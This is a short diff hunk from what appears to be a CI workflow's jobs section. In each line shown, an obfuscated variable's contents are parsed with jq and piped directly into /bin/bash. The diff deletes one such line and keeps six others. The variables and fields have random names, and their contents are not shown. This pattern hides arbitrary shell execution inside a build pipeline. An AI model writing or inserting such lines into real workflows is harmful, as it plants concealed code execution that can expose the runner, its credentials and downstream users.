@@ -43,7 +43,6 @@ jobs:
           echo $rv9 | jq -r .m27 | /bin/bash
           echo $ys5842 | jq -r .dn94 | /bin/bash
           echo $ypo19683 | jq -r .h0616 | /bin/bash
-          echo $sptxf896 | jq -r .mdl617 | /bin/bash
           printf '%s' "$rb5" | jq -r .bho6064 | /bin/bash
           printf '%s' "$a90" | jq -r .wigx4807 | /bin/bash
           echo $qxznr27 | jq -r .hg25 | /bin/bash
